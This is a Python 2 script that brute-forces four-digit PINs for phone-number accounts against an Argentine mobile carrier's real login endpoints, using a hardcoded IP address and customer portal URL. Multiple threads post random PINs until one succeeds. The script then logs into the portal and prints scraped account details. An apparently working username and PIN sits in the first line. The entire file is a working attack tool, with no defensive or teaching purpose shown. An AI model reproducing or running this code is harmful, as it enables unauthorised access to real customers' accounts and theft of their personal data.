#id1_hf_0=&username=3834219205&password=3609&x=37&y=6
#pip install requests==0.12.1
import requests;
from colorama import Fore
from colorama import init
from random import randrange
import html2text
import StringIO
import threading
import sys
import os
import time


class KThread(threading.Thread):
  """A subclass of threading.Thread, with a kill()
method."""
  def __init__(self, *args, **keywords):
    threading.Thread.__init__(self, *args, **keywords)
    self.killed = False

  def start(self):
    """Start the thread."""
    self.__run_backup = self.run
    self.run = self.__run      # Force the Thread toinstall our trace.
    threading.Thread.start(self)

  def __run(self):
    """Hacked run function, which installs the
trace."""
    sys.settrace(self.globaltrace)
    self.__run_backup()
    self.run = self.__run_backup

  def globaltrace(self, frame, why, arg):
    if why == 'call':
      return self.localtrace
    else:
      return None

  def localtrace(self, frame, why, arg):
    if self.killed:
      if why == 'line':
        raise SystemExit()
    return self.localtrace

  def kill(self):
    self.killed = True



class Funciones():

    def __init__(self,num):
        self.username = num;
        self.key="";
        init()
        self.h = html2text.HTML2Text()
        self.h.ignore_links = True
        self.numT=1;
        self.threads = list()
        self.flag=0;


    def randomGenerator(self):
        for i in range(4):
            #print key;
            self.key += str(randrange(10));

    def postData(self):

        returnData = False;
        sendData='id1_hf_0=&username='+str(self.username)+'&password='+str(self.key)+'&x=37&y=6';
        r = requests.post('http://170.51.242.151:8680/dm-sc-claro/signin?wicket:interface=:4:signInForm::IFormSubmitListener::',data=sendData);
        respuesta = ""+r.text;
        #print r.text;
        if(respuesta.find('<span title="Home">'+str(self.username)+'</span>') > -1):
            returnData = True;
	



        return returnData;

    def start(self):

        while(True):
            if(self.key==""):
                self.randomGenerator();
            #self.key="3609";
            respuesta = self.postData();
            if(respuesta == True):
		
                self.getDatos();
                break;



            else:
               print (Fore.WHITE + str(self.username) + ":" + str(self.key) + " Bad Combination!!!");
               self.key="";




    def exploit(self):
        tmp=0;
        nThread = raw_input("Ingrese cantidad de hilos (Default=1)\n");
        if(nThread!=""):
            self.numT = int(nThread)
        for i in range(self.numT):
            t = KThread(target=self.start)
            self.threads.append(t)
            t.start()
        tmp=len(self.threads)
        print("Search password\n")


    def setTestKey(self, key):
        
        self.key = str(key);

    def getDatos(self):
        #print("consultado a: http://individuos.claro.com.ar\n")
        sendData='_58_login='+str(self.username)+'&_58_password='+str(self.key)+'&redirect=&login=Y';
        r = requests.post('https://individuos.claro.com.ar/web/guest/bienvenido?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-2&p_p_col_count=2&saveLastPath=0&_58_struts_action=%2Flogin%2Flogin&_58_doActionAfterLogin=false', data=sendData);

        respuesta = r.text;
        txt = self.h.handle(respuesta);
        buf = StringIO.StringIO(txt)
        contador = 0;
        data = buf.readlines();
        flag=False;
        #print txt
        filter = {"https://individuos.claro.com.ar/ClaroTheme-theme/images/_icon/account.png","https://individuos.claro.com.ar/ClaroTheme-theme/images/16px/cell1.png","https://individuos.claro.com.ar/ClaroTheme-theme/images/16px/user.png","https://individuos.claro.com.ar/ClaroTheme-theme/images/16px/plus.png","https://individuos.claro.com.ar/ClaroTheme-theme/images/16px/bullets.png","https://individuos.claro.com.ar/ClaroTheme-theme/images/16px/a.png"}
        for line in data:
            for url in filter:
                if(line.find(url) > -1):
                    print data[contador+2];
		    flag=1                    
            contador+=1;
        
	if(flag==1):
        	print (Fore.GREEN + str(self.username) + ":" + str(self.key) + " is Correct!!!");
		os.system('pkill python')
	else:
		print (Fore.GREEN + str(self.username) + ":" + str(self.key) + " is Correct!!!");
		print("Linea Bloqueada")
		os.system('pkill python')


